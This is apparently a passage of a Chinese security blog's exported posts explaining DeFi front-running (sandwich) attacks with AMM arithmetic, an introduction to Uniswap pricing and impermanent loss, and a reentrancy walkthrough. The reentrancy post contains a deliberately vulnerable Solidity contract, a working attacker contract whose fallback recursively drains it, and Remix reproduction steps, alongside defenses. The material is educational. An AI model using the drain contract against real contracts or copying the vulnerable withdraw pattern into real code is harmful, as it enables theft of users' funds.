id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h2><p>我们知道，现如今的主流 DEX 如 Uniswap 等，采用的都是 AMM （自动化做市商）机制，其价格遵循恒定乘积公式。例如，在 Uniswap 中建立一个 A 代币与 ETH 的流动池，A 数量为 1000，ETH 数量为 100，则两者数量乘积为 100000，当前 A 价格为 0.1ETH。当 Alice 试图用 10 个 ETH 来池子里购买 A 时，他所得到的 A 的数量 X，可以用下面的公式推导 (注：为简化计算，以下均未考虑手续费)：<br/><br><code>（1000-X）\*（100+10）= 100000，X = 90.9</code><br/><br>这笔交易中，A 的价格为 10/90.9 = 0.11，相比于原来 A 的价格，价格滑点为 :（0.11-0.1）/0.1*100% = 10%一笔交易就让币价产生了 10% 的滑点，可见越是流动性差的池子，遇到大额交易，越是容易产生滑点。而如果，能在用户正常的大额交易前（预计该交易会产生较大滑点），抢先买入 A，再在用户正常交易后，将刚买入的 A 卖出，就可以获得一笔不菲的收益。沿用刚才的例子，假设在 Alice 的交易前，Bob 抢先花 5 个 ETH 购买 A，然后在 Alice 的交易完成后，Bob 再把之前买入的 A 卖出，我们看看会有什么样的结果。<br/><br>首先是 Bob 的抢跑交易：<br/><br><code>(1000-X)\*(100+5) = 100000, X = 47.62</code><br/><br>即，Bob 用 5ETH 购得 47.62 个 A接下来是 Alice 的正常交易，注意此时流动池中 A 的数量变为 952.38，ETH 的数量变为 105：<br/><br><code>(952.38-X)\*(105+10) = 100000, X = 82.81</code><br/><br>最后 Bob 卖出 47.62 个 A 的交易，此时流动性中 A 的数量为 869.57，ETH 的数量为 115：<br/><br><code>(869.57+47.62）\*（115-Y）= 100000，Y = 5.97</code><br/><br>通过这一次抢跑攻击，Bob 净赚 5.97-5 = 0.97 个 ETH，而 Alice 净亏 90.9-82.81 = 8.09 个 A，Bob 通过使 Alice 蒙受更大的滑点损失来获得自己的收益！</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>作为一般用户，应对 Front-Running 可以有以下几种手段：</p><blockquote><ul><li>设置较低的交易滑点，比如 0.1%，这会让抢跑机器人缺少可盈利的空间。 缺点：滑点过低导致大额交易十分容易失败，且失败的交易仍然需要支付高昂手续费。</li><li>提高 gas 费用，这会增加机器人的攻击成本。缺点：这同样也增加了自己的交易成本。<br/></li></ul></blockquote><p>可以看出，以上解决方案都是无奈之举，且有各种不足，幸运的是，有很多团队认识到了 Front-Running 的危害性，并提出了不少有建设性的解决方案。首先通过对捕猎全过程的分析，我们可以得出结论，要实现 Front-Running，需要几个要素：</p><blockquote><ul><li>Transaction 公开性：可以在交易池中获取交易的详细信息以太坊交易执行机制：</li><li>可以通过 gas 竞争的方式抢先完成交易</li><li>AMM 交易曲线机制：恒定乘积机制可以造成较大滑点</li></ul></blockquote><p>反制手段就是分别在这几个要素上做文章。</p><ul><li><strong>避免Transaction公开性</strong><br/><br>  既然机器人是通过分析交易池中的交易来决定是否发起攻击，那么我们将交易信息直接加密，让机器人看不到或者看不懂不就好了？<br/><br>  社区中就有人提议使用零知识证明技术 zk-SNARKs 来达成上述目标，即运用 zk-SNARKs 将每笔交易的信息都加密隐藏起来，让机器人无从下手。<br/><br>  不过，目前该方案还不够成熟，存在需要消耗更高 Gas 费用和可能被利用来进行阻塞攻击，导致系统化整体 liveness 的缺陷。<br>  <br/></li><li><p><strong>更改以太坊交易执行机制</strong><br/><br>  当前的以太坊交易执行机制是通过 Gas 竞争来完成的，即谁出的 Gas 费高，矿工就优先打包谁的交易，那么我们如果绕过这种机制，把交易发给矿工让其直接打包，就杜绝了抢跑机器人在中途攻击的可能性<br/><br>  所以一种类似于 Layer 0 的方案也得到了一些应用，如星火矿池的 Taichi 服务，用户可以直接在 MetaMask 中设置 Taichi 的以太坊节点，这样交易就直接在没有出现在 Mempool 的情况下被打包了，但劣势是被打包的时效有一定的不确定性。<br/><br>  另外，如 ArcherSwap 类似理念的解决方案，构建了交易者和矿工之间的桥梁，交易者可以通过打赏的形式让矿工直接打包自己的交易，这就避免了被 Front-Running 的可能。虽然有那么点交保护费来避免被攻击的感觉，但也实实在在的降低了交易者的成本，而且有着不收取交易失败费用的优势。</p></li><li><p><strong>AMM 算法优化</strong><br>  在 AMM 机制下，大额交易产生过大的价格滑点（可理解为一个临时的错误价格），是 Front-Running 的利润空间，如果有一种 AMM 机制可以减少大额交易对后续交易价格的影响，就可以有效防止 Front-Running 攻击<br/><br>  早在 2018 年，Vitalik 在以太坊技术社区中提供了一个 方案，当发生兑换交易时，交易池价格不会立刻调整成真实价格，而是在若干分钟内，缓慢的趋向真实价格，这就好像交易池凭空多出了很多流动性一样，因此我们将这种技术称之为 Vitrual Balance （虚拟余额）技术。这种新机制，可大大压缩套利者的利润空间，有效防御 Front-Running 攻击，同时还可以增加流动性做市商的收益，可谓一举多得，1inch 的 mooniswap 就是这个方案的一个实现版本.</p></li><li><p><strong>增加流动性</strong><br>  此外，还有种思路，就是尽可能的加大交易池中特定价格区间的流动性，流动性越大，滑点越小，当流动性大到一定程度的时候，抢跑机器人就丧失了盈利空间，Uniswap 的 V3 版本的聚焦流动性特性，就是在这方面做出的努力。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主流DES——Uniswap简介</title>
      <link href="/Uniswap%E7%9A%84%E7%AE%80%E4%BB%8B/"/>
      <url>/Uniswap%E7%9A%84%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="主流-DEX—Uniswap介绍"><a href="#主流-DEX—Uniswap介绍" class="headerlink" title="主流 DEX—Uniswap介绍"></a>主流 DEX—Uniswap介绍</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>以太坊 1.0 的严重限制让简便的 Uniswap 脱颖而出，但以太坊 2.0 和 L2 链下系统将使更复杂的市场蓬勃发展。<br>“有个商业设想。开发一个AMM。不管谁来询价，我随时都能报出一个价格，我的定价算法会用 x * y = k。差不多就这些。想投资吗？”你会躲得远远的。<br/><br>其实，刚才描述的就是 Uniswap。Uniswap 也许是世界上最原始的链上做市商运作。莫名其妙的，它的交易量过去几个月出现爆发式增长，凭交易量已成为世界最大的去中心化交易所（DEX） 。</p><h2 id="展开"><a href="#展开" class="headerlink" title="展开"></a>展开</h2><blockquote><p>我们接下来的只会对niswap的做市机制进行解析，如果想要了解uniswap的底层源码逻辑，可以关注我之后的文章。</p></blockquote><p>Uniswap 是一个自动做市商，即 AMM。你可以把 AMM 设想成一个原始的、机器人式的做市商，它根据一个简单的定价算法，在两种资产之间随时提供报价。对 Uniswap 而言，它对这两种资产进行报价，其持有的每种资产的单位数相乘，总会等于一个常数。如果 Uniswap 拥有一些 x 代币，拥有一些 y 代币，它给每一笔交易定价，所以，它拥有的 x 的最终数量，和拥有的 y 的最终数量，两者相乘会等于一个常数 k。这就形成了一个常数积的等式：<code>x * y = k</code>。<br>这种对两种资产进行定价的方式，你可能会觉得非常怪异且过于独断。让两种代币的库存数相乘所得的积维持固定，为什么就能确保正确的报价呢？<br/><br>下面我们就通过一个简单的例子了解一下Uniswap</p><ul><li><p><strong>Uniswap 示例</strong><br>  假设我们在 Uniswap 的某个池里投入 50 个苹果 （a） 和 50 个香蕉 （b） ，任何人都可以用苹果换香蕉，或者用香蕉换苹果。假设一级市场中苹果与香蕉的汇率刚好是 1:1。因为该 Uniswap 资金池中分别有 50 个苹果和 50 个香蕉，因此，按上述常数积的等式规则，a <em> b = 2500 。对于任何交易，Uniswap 都需要保证，池中库存的苹果数和香蕉数相乘等于 2500。<br/><br>  假设一位客户进入我们的 Uniswap 池来买一个苹果。她应该支付多少个香蕉呢？如果她买走一个苹果，我们的池里就剩下 49 个苹果，而 49</em> b 依然需要等于 2500。这样香蕉的总数 b 就等于 51.02。由于之前池中有 50 个香蕉，因此我们还需要 1.02 个香蕉（在这个宇宙中我们允许碎片化香蕉的存在） ，因此，这位客户买一个苹果会得到的报价是：1.02 香蕉 / 苹果。</p><blockquote><p>请注意，这与两者之间 1:1 的原始价格很接近！因为这只是一笔小额交易，所以滑点较小。</p></blockquote><p>  <img src="Uniswap1.webp" alt=""></p><p>  如果她想买 10 个苹果， Uniswap 的报价会是 12.5 个香蕉，即这 10 个苹果每个的单价为 1.25 香蕉 / 苹果。如果她想要执行 25 个苹果这种大额交易，即要买库存苹果数量的一半，那么，单位价格会上涨到 2 香蕉 / 苹果！ </p><blockquote><p>可以看到当交易额变大，交易价格就会比原始价格成倍增长</p></blockquote></li><li><p><strong>抢先交易攻击（三明治攻击）的引申</strong><br>  在上面对Uniswap的介绍中其实我们可以发现一个好玩的地方。<br/><br>  如果苹果与香蕉之间的真实交易价格是 1:1，当第一位客户买走 10 个苹果后，我们 Uniswap 池就有会变成 40 个苹果和 62.5 个香蕉。如果有位<strong>套利者</strong>此时进入，她买走 12.5 个香蕉，让资金池恢复到最初状态，她只需付 10 个苹果，所以 Uniswap 对她的收费只有 0.8 苹果 / 香蕉。<br>  不难发现，Uniswap 会低价甩卖香蕉！就好像我们的算法此时意识到香蕉过多，所以它低价抛售香蕉，以吸引苹果流入，从而实现库存的再平衡。</p><blockquote><p>抢先交易攻击正是利用了这一特性，来赚取”差价”<br>  具体的抢先交易攻击我会放到下一章来讲</p></blockquote></li><li><p>套利损失（Impermanent Loss）简介</p><p>  下面你将了解 Uniswap 定价机制的工作方式。但这仍然引出一个问题——Uniswap 很好的完成了它工作吗？这东西真的会产生利润吗？毕竟，任何做市商都可以报价，但是否赚钱就不好说了。<br/><br>  答案是：取决于具体情况！具体来说，这取决于一种被称为<strong>套利损失</strong>的概念。它的运作方式如下：<br>  Uniswap 会对每笔交易收取少量费用 （目前为 0.3%） 。这是在名义价格之外的。因此，如果苹果和香蕉总是且永远以 1:1 价格进行交易，随着做市商在交易价格曲线上来回移动，这些费用将随时间累积。那么，与只持有 50 个苹果和 50 个香蕉的基线比较，Uniswap 池最终会积累更多的水果。<br/><br>  但是，如果苹果和香蕉之间的真实交易价格突然发生变化，会发生什么呢？假设某家香蕉农场遭遇了无人机攻击，出现大面积的香蕉短缺。香蕉现在像黄金一样贵。交易价格蹿升到 5 个苹果换 1 个香蕉。<br/><br>  Uniswap 上会发生什么？<br/><br>  套利者一秒都不会耽搁，立马杀入你的 Uniswap 池，抢购便宜的香蕉。他们调整交易规模，以便买走价格低于新汇率 5:1 的所有香蕉。这意味着他们需要移动价格曲线，直到满足以下等式：5x * x = 2500。<br/><br>  <img src="Uniswap2.webp" alt=""><br>  算一下这个数学题，你会得到如下结果：他们总共以 61.80 个苹果买到 27.64 个香蕉。平均交易价格为 2.2 个苹果：1 个香蕉，这远低于市场价，相当于得到 76.4 个免费苹果。</p><blockquote><p>这种现象称为「套利损失」。每当交易价格发生变动，就会出现套利者窃取廉价资产，直到资金池的定价达到正确为止。 </p></blockquote></li></ul><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>自 2018 年上线以来， Uniswap 已经席卷 DeFi 领域。考虑到 Uniswap 的原始版本只有大约 300 行代码，这一成绩尤其令人惊讶！ （AMM 本身拥有历史悠久的血统，但是常数函数做市商是一个相对较新的发明。） Uniswap 完全无需许可，任何人都可以注入资产。它甚至不需要预言机。回顾一下会发现它非常优雅，是可能发明的最简单的产品之一，它似乎从石头缝里诞生，并主导了 DeFi 领域。</p>]]></content>
      
      
      <categories>
          
          <category> Uniswap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Uniswap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ReentryAttack</title>
      <link href="/ReentryAttack/"/>
      <url>/ReentryAttack/</url>
      
        <content type="html"><![CDATA[<h1 id="重入攻击分析"><a href="#重入攻击分析" class="headerlink" title="重入攻击分析"></a>重入攻击分析</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>在以太坊中，智能合约能够调用其他外部合约的代码，由于智能合约可以调用外部合约或者发送以太币，这些操作需要合约提交外部的调用，所以这些合约外部的调用就可以被攻击者利用造成攻击劫持，使得被攻击合约在任意位置重新执行(回调)，绕过原代码中的限制条件，从而发生重入攻击。重入攻击本质上与编程里的递归调用类似，所以当合约将以太币发送到未知地址时就可能会发生。</p><ul><li><strong>发生条件</strong><ol><li>调用了外部的合约且该合约是不安全的</li><li>外部合约的函数调用早于状态变量的修改</li></ol></li></ul><p>接下来给大家展示的是一个最简单的提款函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function withdraw()&#123;</span><br><span class="line">  require(msg.sender,call.value(balances[msg.sender])());</span><br><span class="line">  balances[msg.sender]&#x3D;0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这种函数大多存在于钱包、去中心化交易所中，目的是为了让用户提款，将合约中的代币转换成通用的以太币。<br/></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><pre><code>在进入分析之前，先介绍几个基础知识</code></pre><ul><li>以太坊常用的转账的方法<ol><li>transfer()：只会发送 2300 gas 进行调用，当发送失败时会通过 throw 来进行回滚操作，从而防止了重入攻击。</li><li>send()：只会发送 2300 gas 进行调用，当发送失败时会返回布尔值 false，从而防止了重入攻击。</li><li>gas().call.vale()()：在调用时会发送所有的 gas，当发送失败时会返回布尔值 false，不能有效的防止重入攻击。</li></ol></li><li><p>fallback函数<br>  回退函数 (fallback function)：回退函数是每个合约中有且仅有一个没有名字的函数，并且该函数无参数，无返回值，如下所示：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function() public payable&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  回退函数在以下几种情况中被执行：</p><ol><li>调用合约时没有匹配到任何一个函数</li><li>没有传数据</li><li>智能合约收到以太币（为了接受以太币，fallback 函数必被标记为 payable）</li></ol></li><li><p>漏洞<br>  通过我们对fallback函数的了解。<br>  如果我们构造一个 fallback 函数，函数里面也调用对方的 withdraw 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）<br>  <img src="Reenter1.png" alt="攻击原理"><br>  我们先来看一段比较典型的有重入漏洞的合约：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract Reentrance&#123;</span><br><span class="line">    address _owner;</span><br><span class="line">    mapping (address &#x3D;&gt; uint256) balances;</span><br><span class="line"></span><br><span class="line">    function Reentrance()&#123;</span><br><span class="line">        _owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public payable&#123;</span><br><span class="line">        require(balances[msg.sender] &gt;&#x3D; amount);</span><br><span class="line">        require(this.balance &gt;&#x3D; amount);</span><br><span class="line">        &#x2F;&#x2F; 发送以太</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        &#x2F;&#x2F; 状态变量修改</span><br><span class="line">        balances[msg.sender] -&#x3D; amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable&#123;</span><br><span class="line">        balances[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address adre)constant returns(uint256)&#123;</span><br><span class="line">        return balances[adre];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function wallet() constant returns(uint256 result)&#123;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  我们来看这个合约的 withdraw 函数，这个函数中的转账操作有一个外部调用（msg.sender.call.value(amount)()），所以我们就可以认为这个合约是可能有重入漏洞的，但是具体能否产生危害还需要更深入的分析：</p><ul><li>攻击者思路：<blockquote><ol><li>所有的外部调用都是不安全的且合约在接收以太的时候会触发 fallback 函数执行相应的逻辑，这是一种隐藏的外部调用，这种隐藏的外部调用是否会造成危害呢？</li><li>我们可以看到在 withdraw 函数中是先执行外部调用进行转账后才修改用户余额状态变量的，那我们可不可以在转账外部调用的时候构造一个恶意的逻辑合约在合约执行 balance[msg.sender] -= amount 之前一直循环调用 withdraw 函数一直提币从而将合约账户清空呢？</li></ol></blockquote></li><li>攻击合约：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line">import&quot;.&#x2F;Reentrance.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ReentranceAttack&#123;</span><br><span class="line">    Reentrance re;</span><br><span class="line">    function ReentranceAttack(address _target) public payable&#123;</span><br><span class="line">        re &#x3D; Reentrance(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function wallet()view returns(uint256)&#123;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit()public payable &#123;</span><br><span class="line">        re.deposit.value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()&#123;</span><br><span class="line">        re.withdraw(1);</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        if (address(re).balance &gt;&#x3D; 1 ether)&#123;</span><br><span class="line">            re.withdraw(1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>攻击原理：<br>  由于受害者合约withdraw函数使用call函数转账，会附加”所有可用gas”，并触发msg.sender的fallback函数。fallback 函数再次调用withdraw函数套利，由于withdraw函数最后一步才减去msg.sender对应的余额并记录导致递归调用withdraw函数require判断都能通过。直到合约中没有可用余额为止。<br>  类似于对攻击者fallback函数的递归调用<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2>首先用账户(<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code>)模拟受害者，点击depoly开始部署。<br><img src="Reenter2.png" alt=""><br>然后将Value改为5，单位改为ether。点击deposit方法<br><img src="Reenter3.png" alt=""><br>查看当前账户余额为5ether，存款成功<br><img src="Reenter4.png" alt=""><br>创建一个新账户（<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>）来模拟攻击者，在Deploy处填写漏洞合约地址，部署攻击合约。<br><img src="Reenter5.png" alt=""><br>部署成功后，先查看攻击合约的wallet为0<br><img src="Reenter6.png" alt=""><br>攻击者先存款 1 ether 到漏洞合约中，这里设置 VALUE 为 1 ether，之后点击攻击合约的 deposit 进行存款。<br><img src="Reenter7.png" alt=""><br>再次调用漏洞合约的wallet方法，却发现有了6 ether<br><img src="Reenter8.png" alt=""><br>攻击者 (<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>) 调用攻击合约的 attack 函数模拟攻击，之后调用被攻击合约的 wallet 函数去查看合约的余额，发现已经归零，此时回到攻击合约查看余额，发现被攻击合约中的 6 ether 已经全部提款到了攻击者合约中，这就造成了重入攻击。<br><img src="Reenter9.png" alt=""></li></ul></li></ul><h2 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><ul><li><p><strong>加入防重入锁</strong><br>  下面是一个防重入锁的例子：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.3;</span><br><span class="line"></span><br><span class="line">contract ReEntrancyGuard &#123;</span><br><span class="line">    bool internal locked;</span><br><span class="line"></span><br><span class="line">    modifier noReentrant() &#123;</span><br><span class="line">        require(!locked, &quot;No re-entrancy&quot;);</span><br><span class="line">        locked &#x3D; true;</span><br><span class="line">        _; </span><br><span class="line">    locked &#x3D; false; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>写代码时需要遵循先判断，后写入变量在进行外部调用的编码规范（Checks-Effects-Interactions）</strong></p></li><li><p><strong>使用send() 和 transfer() 转币，只会传递2300Gas供调用，防止重入攻击。</strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
